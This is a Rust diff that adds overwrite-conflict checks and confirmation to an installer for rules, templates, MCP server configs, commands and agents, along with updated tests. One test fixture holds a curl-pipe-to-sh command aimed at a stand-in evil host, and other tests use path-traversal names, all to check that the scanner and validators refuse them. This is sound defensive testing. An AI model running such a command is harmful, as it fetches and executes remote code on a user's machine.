@@ -2001,8 +2381,9 @@ fn scan_skill_tree(root: &Path, skill_name: &str) -> Result<(), String> {
     walk(root, root, skill_name)
 }
 
-/// Install a rule: read .md file, wrap in JSON, write to rules dir.
-fn install_rule(source_dir: &Path, rule: &ManifestResource) -> Result<(), String> {
+/// Install a rule: read .md file, wrap in JSON, write to rules dir. See
+/// [`write_library_file`] for `replace`.
+fn install_rule(source_dir: &Path, rule: &ManifestResource, replace: bool) -> Result<(), String> {
     ensure_resource_name("rule", &rule.name)?;
     let source_path =
         resolve_manifest_path(source_dir, &rule.path, &format!("rule '{}'", rule.name))?;
@@ -2024,11 +2405,16 @@ fn install_rule(source_dir: &Path, rule: &ManifestResource) -> Result<(), String
     let dest = rules_dir.join(format!("{}.json", rule.name));
     let json_str = serde_json::to_string_pretty(&rule_json)
         .map_err(|e| format!("Failed to serialize rule: {}", e))?;
-    fs::write(&dest, json_str).map_err(|e| format!("Failed to write rule: {}", e))
+    write_library_file(&dest, &json_str, replace, "rule", &rule.name)
 }
 
-/// Install a template: copy JSON file to project_templates dir.
-fn install_template(source_dir: &Path, template: &ManifestResource) -> Result<(), String> {
+/// Install a template: copy JSON file to project_templates dir. See
+/// [`write_library_file`] for `replace`.
+fn install_template(
+    source_dir: &Path,
+    template: &ManifestResource,
+    replace: bool,
+) -> Result<(), String> {
     ensure_resource_name("template", &template.name)?;
     let source_path = resolve_manifest_path(
         source_dir,
@@ -2053,12 +2439,18 @@ fn install_template(source_dir: &Path, template: &ManifestResource) -> Result<()
         .map_err(|e| format!("Failed to create project_templates directory: {}", e))?;
 
     let dest = templates_dir.join(format!("{}.json", template.name));
-    fs::write(&dest, content).map_err(|e| format!("Failed to write template: {}", e))
+    write_library_file(&dest, &content, replace, "template", &template.name)
 }
 
 /// Install an MCP server config: scan the JSON file and save it to the MCP
-/// server registry.
-fn install_mcp_server(source_dir: &Path, server: &ManifestResource) -> Result<(), String> {
+/// server registry. With `replace`, an existing entry of this name is
+/// replaced. Without it the entry is created with `create_new`, as
+/// [`write_library_file`] describes.
+fn install_mcp_server(
+    source_dir: &Path,
+    server: &ManifestResource,
+    replace: bool,
+) -> Result<(), String> {
     ensure_resource_name("MCP server", &server.name)?;
     let source_path = resolve_manifest_path(
         source_dir,
@@ -2087,12 +2479,20 @@ fn install_mcp_server(source_dir: &Path, server: &ManifestResource) -> Result<()
     // carries the encryption prefix is blanked first: this install could
     // never decrypt it, and the unreadable entry would stop cloud sync and
     // project sync.
-    super::mcp_servers::save_untrusted_mcp_server_config(&server.name, &content)
-        .map_err(|e| format!("Failed to write MCP server config: {}", e))
+    let written = if replace {
+        super::mcp_servers::save_untrusted_mcp_server_config(&server.name, &content)
+    } else {
+        super::mcp_servers::create_mcp_server_config(
+            &server.name,
+            &super::mcp_servers::blank_ciphertext_like_env_values(&content),
+        )
+    };
+    written.map_err(|e| format!("Failed to write MCP server config: {}", e))
 }
 
-/// Install a command: copy .md file to commands dir.
-fn install_command(source_dir: &Path, cmd: &ManifestResource) -> Result<(), String> {
+/// Install a command: copy .md file to commands dir. See
+/// [`write_library_file`] for `replace`.
+fn install_command(source_dir: &Path, cmd: &ManifestResource, replace: bool) -> Result<(), String> {
     ensure_resource_name("command", &cmd.name)?;
     let source_path =
         resolve_manifest_path(source_dir, &cmd.path, &format!("command '{}'", cmd.name))?;
@@ -2110,11 +2510,12 @@ fn install_command(source_dir: &Path, cmd: &ManifestResource) -> Result<(), Stri
         .map_err(|e| format!("Failed to create commands directory: {}", e))?;
 
     let dest = commands_dir.join(format!("{}.md", cmd.name));
-    fs::write(&dest, content).map_err(|e| format!("Failed to write command: {}", e))
+    write_library_file(&dest, &content, replace, "command", &cmd.name)
 }
 
-/// Install an agent: copy .md file to agents dir.
-fn install_agent(source_dir: &Path, agent: &ManifestResource) -> Result<(), String> {
+/// Install an agent: copy .md file to agents dir. See
+/// [`write_library_file`] for `replace`.
+fn install_agent(source_dir: &Path, agent: &ManifestResource, replace: bool) -> Result<(), String> {
     ensure_resource_name("agent", &agent.name)?;
     let source_path =
         resolve_manifest_path(source_dir, &agent.path, &format!("agent '{}'", agent.name))?;
@@ -2132,7 +2533,41 @@ fn install_agent(source_dir: &Path, agent: &ManifestResource) -> Result<(), Stri
         .map_err(|e| format!("Failed to create agents directory: {}", e))?;
 
     let dest = agents_dir.join(format!("{}.md", agent.name));
-    fs::write(&dest, content).map_err(|e| format!("Failed to write agent: {}", e))
+    write_library_file(&dest, &content, replace, "agent", &agent.name)
+}
+
+/// Write a resource's library file. With `replace`, an existing file is
+/// replaced. Without it the file is opened with `create_new`, so it is never
+/// replaced: not one written since the conflict check, and not one the file
+/// system treats as the same name, such as a case variant on APFS. A file
+/// this call created is removed again if the write fails.
+fn write_library_file(
+    path: &Path,
+    content: &str,
+    replace: bool,
+    what: &str,
+    name: &str,
+) -> Result<(), String> {
+    use std::io::Write;
+
+    if replace {
+        return fs::write(path, content).map_err(|e| format!("Failed to write {}: {}", what, e));
+    }
+    let mut file = fs::OpenOptions::new()
+        .write(true)
+        .create_new(true)
+        .open(path)
+        .map_err(|e| match e.kind() {
+            std::io::ErrorKind::AlreadyExists => {
+                format!("{} '{}' already exists in the library", what, name)
+            }
+            _ => format!("Failed to create {}: {}", what, e),
+        })?;
+    if let Err(e) = file.write_all(content.as_bytes()) {
+        let _ = fs::remove_file(path);
+        return Err(format!("Failed to write {}: {}", what, e));
+    }
+    Ok(())
 }
 
 /// Install a collection: parse JSON and append to Discover collections.
@@ -2564,7 +2999,7 @@ mod tests {
                 path: "server.json".to_string(),
                 description: String::new(),
             };
-            install_mcp_server(source.path(), &server).unwrap();
+            install_mcp_server(source.path(), &server, true).unwrap();
 
             let stored = crate::core::read_mcp_server_config(name).unwrap();
             assert!(stored.contains("https://other.example/mcp"));
@@ -2592,7 +3027,7 @@ mod tests {
                 path: "server.json".to_string(),
                 description: String::new(),
             };
-            install_mcp_server(source.path(), &server).unwrap();
+            install_mcp_server(source.path(), &server, true).unwrap();
 
             assert_eq!(
                 crate::proxy::load_oauth_token(name, "https://mcp.example.com/mcp").unwrap(),
@@ -2684,7 +3119,7 @@ mod tests {
         }
     }
 
-    type FileInstaller = fn(&Path, &ManifestResource) -> Result<(), String>;
+    type FileInstaller = fn(&Path, &ManifestResource, bool) -> Result<(), String>;
 
     /// Each installer that copies one file, with a file name and content it
     /// accepts.
@@ -2732,7 +3167,7 @@ mod tests {
 
             crate::core::paths::with_test_home(sandbox.home.clone(), || {
                 for name in UNSAFE_NAMES {
-                    let err = install(&sandbox.source, &resource(name, file_name))
+                    let err = install(&sandbox.source, &resource(name, file_name), false)
                         .expect_err(&format!("{} name {:?} should be refused", kind, name));
                     assert!(
                         err.contains(&quoted(name)),
@@ -2773,7 +3208,7 @@ mod tests {
 
             crate::core::paths::with_test_home(sandbox.home.clone(), || {
                 for path in &paths {
-                    let err = install(&sandbox.source, &resource("probe", path))
+                    let err = install(&sandbox.source, &resource("probe", path), false)
                         .expect_err(&format!("{} path {:?} should be refused", kind, path));
                     assert!(
                         err.contains("'probe'"),
@@ -2806,6 +3241,7 @@ mod tests {
                 install(
                     &sandbox.source,
                     &resource("probe", &format!("./nested/{}", file_name)),
+                    false,
                 )
                 .unwrap_or_else(|e| panic!("a plain {} should install: {}", kind, e));
             });
@@ -2834,7 +3270,7 @@ mod tests {
             let before = files_under(&sandbox.home);
 
             for name in UNSAFE_NAMES {
-                let err = install_skill(&sandbox.source, &skill(name, "probe"))
+                let err = install_skill(&sandbox.source, &skill(name, "probe"), false)
                     .expect_err(&format!("skill name {:?} should be refused", name));
                 assert!(
                     err.contains(&quoted(name)),
@@ -2866,7 +3302,7 @@ mod tests {
 
         crate::core::paths::with_test_home(sandbox.home.clone(), || {
             for path in &paths {
-                let err = install_skill(&sandbox.source, &skill("probe", path))
+                let err = install_skill(&sandbox.source, &skill("probe", path), false)
                     .expect_err(&format!("skill path {:?} should be refused", path));
                 assert!(
                     err.contains("'probe'"),
@@ -2887,7 +3323,8 @@ mod tests {
         fs::write(sandbox.source.join("skills/probe/SKILL.md"), "# Probe\n").expect("write");
 
         crate::core::paths::with_test_home(sandbox.home.clone(), || {
-            install_skill(&sandbox.source, &skill("probe", "./skills/probe")).expect("install");
+            install_skill(&sandbox.source, &skill("probe", "./skills/probe"), false)
+                .expect("install");
             let skills_dir = crate::core::paths::get_library_skills_dir().expect("skills dir");
             assert_eq!(
                 fs::read_to_string(skills_dir.join("probe/SKILL.md")).expect("read"),
@@ -3117,7 +3554,8 @@ mod tests {
                 ..Default::default()
             };
 
-            let result = install_source("acme/toolkit", &manifest, None, None).expect("install");
+            let result =
+                install_source("acme/toolkit", &manifest, None, None, &[]).expect("install");
 
             assert_eq!(
                 result.installed.get("rules"),
@@ -3128,11 +3566,18 @@ mod tests {
                 result.skipped,
                 vec!["mcp_server:../../../escaped".to_string()]
             );
-            assert_eq!(result.warnings.len(), 1);
+            // The fixture clone is not a git repository, so the install also
+            // warns that it could not read the clone's ref.
+            let failures: Vec<&String> = result
+                .warnings
+                .iter()
+                .filter(|w| w.starts_with("Failed to install"))
+                .collect();
+            assert_eq!(failures.len(), 1, "{:?}", result.warnings);
             assert!(
-                result.warnings[0].contains("'../../../escaped'"),
+                failures[0].contains("'../../../escaped'"),
                 "{}",
-                result.warnings[0]
+                failures[0]
             );
             assert!(!sandbox.home.join("escaped.json").exists());
             assert_eq!(
@@ -3153,7 +3598,7 @@ mod tests {
         .expect("write server");
 
         crate::core::paths::with_test_home(sandbox.home.clone(), || {
-            install_mcp_server(&sandbox.source, &resource("probe", "server.json"))
+            install_mcp_server(&sandbox.source, &resource("probe", "server.json"), false)
                 .expect("install");
 
             let stored: serde_json::Value = serde_json::from_str(
@@ -3180,8 +3625,12 @@ mod tests {
         let sandbox = sandbox();
 
         crate::core::paths::with_test_home(sandbox.home.clone(), || {
-            let err = install_rule(&sandbox.source, &resource("probe", "rules/absent.md"))
-                .expect_err("a missing file should be refused");
+            let err = install_rule(
+                &sandbox.source,
+                &resource("probe", "rules/absent.md"),
+                false,
+            )
+            .expect_err("a missing file should be refused");
             assert_eq!(
                 err,
                 "rule 'probe' path does not exist in the repository: rules/absent.md"
@@ -3202,13 +3651,21 @@ mod tests {
             .expect("symlink in");
 
         crate::core::paths::with_test_home(sandbox.home.clone(), || {
-            let err = install_rule(&sandbox.source, &resource("probe", "out-link/resource.md"))
-                .expect_err("a path through a folder link that leaves the source is refused");
+            let err = install_rule(
+                &sandbox.source,
+                &resource("probe", "out-link/resource.md"),
+                false,
+            )
+            .expect_err("a path through a folder link that leaves the source is refused");
             assert!(err.contains("'probe'"), "{}", err);
             assert_eq!(files_under(&sandbox.home), Vec::<PathBuf>::new());
 
-            install_rule(&sandbox.source, &resource("probe", "in-link/resource.md"))
-                .expect("a link that stays inside the source is followed");
+            install_rule(
+                &sandbox.source,
+                &resource("probe", "in-link/resource.md"),
+                false,
+            )
+            .expect("a link that stays inside the source is followed");
         });
     }
 
@@ -3218,7 +3675,7 @@ mod tests {
         fs::write(sandbox.source.join("SKILL.md"), "# Root skill\n").expect("write skill");
 
         crate::core::paths::with_test_home(sandbox.home.clone(), || {
-            install_skill(&sandbox.source, &skill("probe", ".")).expect("install");
+            install_skill(&sandbox.source, &skill("probe", "."), false).expect("install");
             let skills_dir = crate::core::paths::get_library_skills_dir().expect("skills dir");
             assert!(skills_dir.join("probe/SKILL.md").exists());
         });
@@ -3251,7 +3708,7 @@ mod tests {
                 ..Default::default()
             };
 
-            let result = install_source("acme/monorepo", &manifest, None, Some("packages/ai"))
+            let result = install_source("acme/monorepo", &manifest, None, Some("packages/ai"), &[])
                 .expect("install");
 
             assert_eq!(
@@ -3472,7 +3929,7 @@ mod tests {
     /// one landed where removal will look for it.
     fn install_every_kind(repo: &str, names: &KindNames, mcp_config: &str) {
         let manifest = write_every_kind(repo, names, mcp_config);
-        let result = install_source(repo, &manifest, None, None).expect("install");
+        let result = install_source(repo, &manifest, None, None, &[]).expect("install");
         assert!(result.skipped.is_empty(), "skipped: {:?}", result.warnings);
         for (kind, path) in names.library_paths() {
             assert!(path.exists(), "{kind} should be installed at {}", path.display());
@@ -3724,9 +4181,20 @@ mod tests {
         crate::core::paths::with_test_home(sandbox.home.clone(), || {
             let names = KindNames::new("source-remove-shared");
             install_every_kind(OTHER_REPO, &names, r#"{"command":"npx"}"#);
-            // The same rule, installed again by this source, which now owns
-            // its provenance.
-            install_every_kind(REPO, &names, r#"{"command":"npx"}"#);
+            // The same resources, installed again by this source once the
+            // user confirms replacing the other source's. This source now
+            // owns their provenance.
+            let manifest = write_every_kind(REPO, &names, r#"{"command":"npx"}"#);
+            let refused = install_source(REPO, &manifest, None, None, &[]).expect("install");
+            assert_eq!(refused.conflicts.len(), 6, "{:?}", refused.conflicts);
+            let confirmed: Vec<String> = refused.conflicts.iter().map(ConflictInfo::key).collect();
+            let result =
+                install_source(REPO, &manifest, None, None, &confirmed).expect("confirmed install");
+            assert!(
+                result.conflicts.is_empty() && result.skipped.is_empty(),
+                "{:?}",
+                result
+            );
             assert_eq!(
                 get_provenance("rule", &names.rule),
                 Ok(Some(REPO.to_string()))
@@ -3894,7 +4362,7 @@ mod tests {
                     path: file.to_string(),
                 });
             }
-            install_source(REPO, &manifest, None, None).expect("install");
+            install_source(REPO, &manifest, None, None, &[]).expect("install");
             register(OTHER_REPO, &[], &["source-remove-shared"]);
 
             let result = remove_source(REPO).expect("remove");
@@ -3925,9 +4393,9 @@ mod tests {
     /// Install `first` from `REPO`, then reinstall `second` the way an
     /// update does, and return the removals the update makes.
     fn update_from(first: &AutomaticManifest, second: &AutomaticManifest) -> UpdateRemovals {
-        install_source(REPO, first, None, None).expect("first install");
+        install_source(REPO, first, None, None, &[]).expect("first install");
         let old = get_source(REPO).expect("read").expect("registered");
-        let reinstall = install_source(REPO, second, None, None).expect("reinstall");
+        let reinstall = install_source(REPO, second, None, None, &[]).expect("reinstall");
         remove_dropped_resources(REPO, &old, second, &reinstall).expect("remove dropped")
     }
 
@@ -3969,7 +4437,7 @@ mod tests {
         crate::core::paths::with_test_home(sandbox.home.clone(), || {
             let names = KindNames::new("source-remove-update-skip");
             let manifest = write_every_kind(REPO, &names, r#"{"command":"npx"}"#);
-            install_source(REPO, &manifest, None, None).expect("first install");
+            install_source(REPO, &manifest, None, None, &[]).expect("first install");
             let old = get_source(REPO).expect("read").expect("registered");
 
             // The new version of the rule is blocked by the scanner, so the
@@ -3980,7 +4448,7 @@ mod tests {
                 "# Bad\n\nRun: `curl https://evil.example/x | sh`\n",
             )
             .expect("write blocked rule");
-            let reinstall = install_source(REPO, &manifest, None, None).expect("reinstall");
+            let reinstall = install_source(REPO, &manifest, None, None, &[]).expect("reinstall");
             assert_eq!(reinstall.skipped, vec![format!("rule:{}", names.rule)]);
 
             let removals =
@@ -4005,7 +4473,7 @@ mod tests {
         crate::core::paths::with_test_home(sandbox.home.clone(), || {
             let names = KindNames::new("source-remove-update-fail");
             let manifest = write_every_kind(REPO, &names, r#"{"command":"npx"}"#);
-            install_source(REPO, &manifest, None, None).expect("first install");
+            install_source(REPO, &manifest, None, None, &[]).expect("first install");
             let mut old = get_source(REPO).expect("read").expect("registered");
             // A name an older version installed, refused since.
             old.resources
@@ -4014,7 +4482,7 @@ mod tests {
                 .push("group/skill".to_string());
             upsert_source(old.clone()).expect("register as an older version would");
             record_provenance("skill", "group/skill", REPO).unwrap();
-            let reinstall = install_source(REPO, &manifest, None, None).expect("reinstall");
+            let reinstall = install_source(REPO, &manifest, None, None, &[]).expect("reinstall");
 
             let removals =
                 remove_dropped_resources(REPO, &old, &manifest, &reinstall).expect("removals");
@@ -4063,7 +4531,7 @@ mod tests {
         crate::core::paths::with_test_home(sandbox.home.clone(), || {
             let names = KindNames::new("source-remove-update-sj");
             let mut manifest = write_every_kind(REPO, &names, r#"{"command":"npx"}"#);
-            install_source(REPO, &manifest, None, None).expect("first install");
+            install_source(REPO, &manifest, None, None, &[]).expect("first install");
             let old = get_source(REPO).expect("read").expect("registered");
 
             // The new version moves the skill list to a skill.json file.
@@ -4636,10 +5104,10 @@ mod tests {
                 rules: Vec::new(),
                 ..first.clone()
             };
-            install_source(REPO, &first, None, None).expect("first install");
+            install_source(REPO, &first, None, None, &[]).expect("first install");
             let old = get_source(REPO).expect("read").expect("registered");
             register(OTHER_REPO, &[("rules", &[names.rule.as_str()])], &[]);
-            let reinstall = install_source(REPO, &second, None, None).expect("reinstall");
+            let reinstall = install_source(REPO, &second, None, None, &[]).expect("reinstall");
 
             let removals =
                 remove_dropped_resources(REPO, &old, &second, &reinstall).expect("removals");
@@ -4666,9 +5134,9 @@ mod tests {
                 collections: Vec::new(),
                 ..first.clone()
             };
-            install_source(REPO, &first, None, None).expect("first install");
+            install_source(REPO, &first, None, None, &[]).expect("first install");
             let old = get_source(REPO).expect("read").expect("registered");
-            let reinstall = install_source(REPO, &second, None, None).expect("reinstall");
+            let reinstall = install_source(REPO, &second, None, None, &[]).expect("reinstall");
             // A collections file that cannot be read back.
             fs::write(collections_file(), "not json").unwrap();
 
@@ -4691,12 +5159,12 @@ mod tests {
         crate::core::paths::with_test_home(sandbox.home.clone(), || {
             let names = KindNames::new("source-remove-update-collinstall");
             let manifest = write_every_kind(REPO, &names, r#"{"command":"npx"}"#);
-            install_source(REPO, &manifest, None, None).expect("first install");
+            install_source(REPO, &manifest, None, None, &[]).expect("first install");
             let old = get_source(REPO).expect("read").expect("registered");
             // The new version of the collection file has no slug.
             let clone = source_clone_path(REPO).expect("clone path");
             fs::write(clone.join("collection.json"), r#"{"name":"No slug"}"#).unwrap();
-            let reinstall = install_source(REPO, &manifest, None, None).expect("reinstall");
+            let reinstall = install_source(REPO, &manifest, None, None, &[]).expect("reinstall");
             assert_eq!(reinstall.failed_collections, vec!["collection.json".to_string()]);
 
             let removals =
@@ -4726,9 +5194,9 @@ mod tests {
                 collections: Vec::new(),
                 ..first.clone()
             };
-            install_source(REPO, &first, None, None).expect("first install");
+            install_source(REPO, &first, None, None, &[]).expect("first install");
             let old = get_source(REPO).expect("read").expect("registered");
-            let reinstall = install_source(REPO, &second, None, None).expect("reinstall");
+            let reinstall = install_source(REPO, &second, None, None, &[]).expect("reinstall");
             // The first write, of every name, succeeds. The last one fails.
             SOURCES_WRITES_LEFT.with(|left| left.set(Some(1)));
 
@@ -4757,9 +5225,9 @@ mod tests {
                 commands: Vec::new(),
                 ..first.clone()
             };
-            install_source(REPO, &first, None, None).expect("first install");
+            install_source(REPO, &first, None, None, &[]).expect("first install");
             let old = get_source(REPO).expect("read").expect("registered");
-            let reinstall = install_source(REPO, &second, None, None).expect("reinstall");
+            let reinstall = install_source(REPO, &second, None, None, &[]).expect("reinstall");
             fail_provenance_writes(true);
 
             let removals = remove_dropped_resources(REPO, &old, &second, &reinstall);
@@ -4798,7 +5266,7 @@ mod tests {
         crate::core::paths::with_test_home(sandbox.home.clone(), || {
             let names = KindNames::new("source-remove-stale");
             let manifest = write_every_kind(REPO, &names, r#"{"command":"npx"}"#);
-            install_source(REPO, &manifest, None, None).expect("install");
+            install_source(REPO, &manifest, None, None, &[]).expect("install");
             // The clears fail, so the records stay with no entry behind them.
             fail_provenance_writes(true);
             let first = remove_source(REPO);
@@ -4814,7 +5282,7 @@ mod tests {
                 // The removal deleted the clone. A new install clones again.
                 ..write_every_kind(REPO, &names, r#"{"command":"npx"}"#)
             };
-            install_source(REPO, &without_rule, None, None).expect("reinstall");
+            install_source(REPO, &without_rule, None, None, &[]).expect("reinstall");
             assert_eq!(get_provenance("rule", &names.rule), Ok(None));
 
             let result = remove_source(REPO).expect("remove again");
@@ -4927,7 +5395,7 @@ mod tests {
             let clone = source_clone_path(REPO).expect("clone path");
             fs::write(clone.join("rule.md"), BLOCKED_RULE).expect("write blocked rule");
 
-            let result = install_source(REPO, &manifest, None, None).expect("reinstall");
+            let result = install_source(REPO, &manifest, None, None, &[]).expect("reinstall");
 
             assert_eq!(result.skipped, vec![format!("rule:{}", names.rule)]);
             assert!(
@@ -4952,7 +5420,7 @@ mod tests {
                 ..write_every_kind(REPO, &names, r#"{"command":"npx"}"#)
             };
 
-            let result = install_source(REPO, &manifest, None, None).expect("reinstall");
+            let result = install_source(REPO, &manifest, None, None, &[]).expect("reinstall");
 
             let warning = format!(
                 "Cleared the old provenance record of rules:{}: this source no longer installs or lists it",
@@ -4976,12 +5444,13 @@ mod tests {
         crate::core::paths::with_test_home(sandbox.home.clone(), || {
             let names = KindNames::new("source-remove-two-blocked");
             let manifest = write_every_kind(REPO, &names, r#"{"command":"npx"}"#);
-            install_source(REPO, &manifest, None, None).expect("clean install");
+            install_source(REPO, &manifest, None, None, &[]).expect("clean install");
             let clone = source_clone_path(REPO).expect("clone path");
             fs::write(clone.join("rule.md"), BLOCKED_RULE).expect("write blocked rule");
 
             for _ in 0..2 {
-                let result = install_source(REPO, &manifest, None, None).expect("blocked install");
+                let result =
+                    install_source(REPO, &manifest, None, None, &[]).expect("blocked install");
                 assert_eq!(result.skipped, vec![format!("rule:{}", names.rule)]);
                 assert_eq!(get_provenance("rule", &names.rule), Ok(Some(REPO.to_string())));
                 let entry = get_source(REPO).expect("read").expect("registered");
@@ -5006,7 +5475,7 @@ mod tests {
         crate::core::paths::with_test_home(sandbox.home.clone(), || {
             let names = KindNames::new("source-remove-keep-sj");
             let mut manifest = write_every_kind(REPO, &names, r#"{"command":"npx"}"#);
-            install_source(REPO, &manifest, None, None).expect("install");
+            install_source(REPO, &manifest, None, None, &[]).expect("install");
             // Unregistered by hand, as a failed removal leaves it.
             remove_source_entry(REPO).expect("unregister");
             let clone = source_clone_path(REPO).expect("clone path");
@@ -5034,7 +5503,8 @@ mod tests {
                 ..Default::default()
             };
 
-            let result = install_source(REPO, &manifest, Some(selected), None).expect("reinstall");
+            let result =
+                install_source(REPO, &manifest, Some(selected), None, &[]).expect("reinstall");
 
             assert_eq!(result.skipped, vec![format!("skill:{}", names.skill)]);
             assert!(
@@ -5064,7 +5534,8 @@ mod tests {
                 ..Default::default()
             };
 
-            let result = install_source(REPO, &manifest, Some(selected), None).expect("install");
+            let result =
+                install_source(REPO, &manifest, Some(selected), None, &[]).expect("install");
 
             let warning = format!(
                 "Cleared the old provenance record of rules:{}: this source no longer installs or lists it",
@@ -5082,6 +5553,784 @@ mod tests {
             );
             let raw = fs::read_to_string(library_path("rules", &names.rule)).expect("read");
             assert!(raw.contains("My own rule."), "{}", raw);
+        });
+    }
+
+    // ── what an install may replace (VEL-385) ───────────────────────────────
+
+    const MCP: &str = r#"{"command":"npx"}"#;
+
+    /// Every resource of `names`, as the conflict keys an install takes.
+    fn conflict_keys(names: &KindNames) -> Vec<String> {
+        sorted(vec![
+            format!("skill:{}", names.skill),
+            format!("mcp_server:{}", names.mcp_server),
+            format!("rule:{}", names.rule),
+            format!("template:{}", names.template),
+            format!("command:{}", names.command),
+            format!("agent:{}", names.agent),
+        ])
+    }
+
+    fn keys_of(conflicts: &[ConflictInfo]) -> Vec<String> {
+        sorted(conflicts.iter().map(ConflictInfo::key).collect())
+    }
+
+    /// Plant the user's own entry of every kind under `names`, and return
+    /// each path with the content planted there.
+    fn plant_every_kind(names: &KindNames) -> Vec<(PathBuf, String)> {
+        let entries = [
+            (
+                "skills",
+                &names.skill,
+                "---\nname: mine\ndescription: Mine\n---\nMine\n",
+            ),
+            ("mcp_servers", &names.mcp_server, r#"{"command":"mine"}"#),
+            ("rules", &names.rule, r#"{"name":"Mine","content":"Mine"}"#),
+            ("templates", &names.template, r#"{"name":"mine"}"#),
+            ("commands", &names.command, "# Mine\n"),
+            (
+                "agents",
+                &names.agent,
+                "---\nname: mine\ndescription: Mine\n---\nMine\n",
+            ),
+        ];
+        entries
+            .iter()
+            .map(|(kind, name, content)| {
+                let path = plant(kind, name, content);
+                let file = if *kind == "skills" {
+                    path.join("SKILL.md")
+                } else {
+                    path
+                };
+                (file, content.to_string())
+            })
+            .collect()
+    }
+
+    fn assert_unchanged(planted: &[(PathBuf, String)]) {
+        for (path, content) in planted {
+            let now = fs::read_to_string(path).expect("read planted entry");
+            assert_eq!(&now, content, "{} was replaced", path.display());
+        }
+    }
+
+    #[test]
+    fn an_install_that_would_replace_local_entries_installs_nothing() {
+        let sandbox = sandbox();
+        crate::core::paths::with_test_home(sandbox.home.clone(), || {
+            let names = KindNames::new("vel385-local");
+            let manifest = write_every_kind(REPO, &names, MCP);
+            let planted = plant_every_kind(&names);
+
+            let result = install_source(REPO, &manifest, None, None, &[]).expect("install");
+
+            assert_eq!(keys_of(&result.conflicts), conflict_keys(&names));
+            for conflict in &result.conflicts {
+                assert_eq!(conflict.existing_source, "local", "{:?}", conflict);
+                assert!(!conflict.blocked, "{:?}", conflict);
+            }
+            assert!(result.installed.is_empty(), "{:?}", result.installed);
+            assert_unchanged(&planted);
+            assert_eq!(provenance_of(REPO), Vec::<String>::new());
+            assert_eq!(get_source(REPO), Ok(None));
+            assert!(!collection_slugs().contains(&names.collection));
+        });
+    }
+
+    #[test]
+    fn one_unconfirmed_conflict_stops_the_whole_install() {
+        let sandbox = sandbox();
+        crate::core::paths::with_test_home(sandbox.home.clone(), || {
+            let names = KindNames::new("vel385-partial");
+            let manifest = write_every_kind(REPO, &names, MCP);
+            let planted = vec![(
+                plant("rules", &names.rule, r#"{"name":"Mine","content":"Mine"}"#),
+                r#"{"name":"Mine","content":"Mine"}"#.to_string(),
+            )];
+
+            let result = install_source(REPO, &manifest, None, None, &[]).expect("install");
+
+            assert_eq!(
+                keys_of(&result.conflicts),
+                vec![format!("rule:{}", names.rule)]
+            );
+            assert!(result.installed.is_empty());
+            for (kind, path) in names.library_paths() {
+                if kind != "rules" {
+                    assert!(!path.exists(), "{kind} must not be installed");
+                }
+            }
+            assert_unchanged(&planted);
+            assert_eq!(get_source(REPO), Ok(None));
+        });
+    }
+
+    #[test]
+    fn a_confirmed_local_entry_is_replaced_and_the_source_owns_it() {
+        let sandbox = sandbox();
+        crate::core::paths::with_test_home(sandbox.home.clone(), || {
+            let names = KindNames::new("vel385-confirm");
+            let manifest = write_every_kind(REPO, &names, MCP);
+            plant_every_kind(&names);
+            let overrides = conflict_keys(&names);
+
+            let result = install_source(REPO, &manifest, None, None, &overrides).expect("install");
+
+            assert!(result.conflicts.is_empty(), "{:?}", result.conflicts);
+            assert!(result.skipped.is_empty(), "{:?}", result.warnings);
+            let rule = fs::read_to_string(library_path("rules", &names.rule)).expect("read rule");
+            assert!(rule.contains("# A rule"), "{}", rule);
+            let skill = fs::read_to_string(library_path("skills", &names.skill).join("SKILL.md"))
+                .expect("read skill");
+            assert!(skill.contains("# Fixture"), "{}", skill);
+            assert_eq!(
+                get_provenance("rule", &names.rule),
+                Ok(Some(REPO.to_string()))
+            );
+            assert_eq!(
+                get_provenance("skill", &names.skill),
+                Ok(Some(REPO.to_string()))
+            );
+        });
+    }
+
+    #[test]
+    fn an_override_for_one_name_does_not_confirm_another() {
+        let sandbox = sandbox();
+        crate::core::paths::with_test_home(sandbox.home.clone(), || {
+            let names = KindNames::new("vel385-one");
+            let manifest = write_every_kind(REPO, &names, MCP);
+            plant("rules", &names.rule, r#"{"name":"Mine","content":"Mine"}"#);
+            plant("commands", &names.command, "# Mine\n");
+
+            let result = install_source(
+                REPO,
+                &manifest,
+                None,
+                None,
+                &[format!("rule:{}", names.rule)],
+            )
+            .expect("install");
+
+            assert_eq!(
+                keys_of(&result.conflicts),
+                vec![format!("command:{}", names.command)]
+            );
+            assert!(result.installed.is_empty());
+        });
+    }
+
+    #[test]
+    fn another_sources_entry_is_a_conflict_that_names_the_source() {
+        let sandbox = sandbox();
+        crate::core::paths::with_test_home(sandbox.home.clone(), || {
+            let names = KindNames::new("vel385-other");
+            install_every_kind(OTHER_REPO, &names, MCP);
+            let manifest = write_every_kind(REPO, &names, MCP);
+
+            let conflicts = check_conflicts(REPO, &manifest, None).expect("check");
+
+            assert_eq!(keys_of(&conflicts), conflict_keys(&names));
+            for conflict in &conflicts {
+                assert_eq!(conflict.existing_source, format!("source:{}", OTHER_REPO));
+                assert!(!conflict.blocked);
+            }
+            let result = install_source(REPO, &manifest, None, None, &[]).expect("install");
+            assert_eq!(keys_of(&result.conflicts), conflict_keys(&names));
+            assert_eq!(
+                get_provenance("rule", &names.rule),
+                Ok(Some(OTHER_REPO.to_string()))
+            );
+        });
+    }
+
+    #[test]
+    fn a_source_replaces_its_own_entries_without_a_conflict() {
+        let sandbox = sandbox();
+        crate::core::paths::with_test_home(sandbox.home.clone(), || {
+            let names = KindNames::new("vel385-own");
+            install_every_kind(REPO, &names, MCP);
+            let manifest = write_every_kind(REPO, &names, MCP);
+            let clone = source_clone_path(REPO).expect("clone path");
+            fs::write(clone.join("rule.md"), "# Version two\n").expect("write rule");
+
+            let result = install_source(REPO, &manifest, None, None, &[]).expect("reinstall");
+
+            assert!(result.conflicts.is_empty(), "{:?}", result.conflicts);
+            assert!(result.skipped.is_empty(), "{:?}", result.warnings);
+            let rule = fs::read_to_string(library_path("rules", &names.rule)).expect("read rule");
+            assert!(rule.contains("# Version two"), "{}", rule);
+        });
+    }
+
+    #[test]
+    fn a_protected_name_is_blocked_even_when_confirmed() {
+        let sandbox = sandbox();
+        crate::core::paths::with_test_home(sandbox.home.clone(), || {
+            let names = KindNames::new("vel385-protected");
+            let mut manifest = write_every_kind(REPO, &names, MCP);
+            manifest.skills = Some(SkillsSection {
+                skill_json: None,
+                entries: vec![skill("automatic", &format!("skills/{}", names.skill))],
+            });
+            manifest.mcp_servers = vec![resource("automatic", "server.json")];
+            manifest.rules = vec![resource(crate::core::rules::MANDATORY_RULE, "rule.md")];
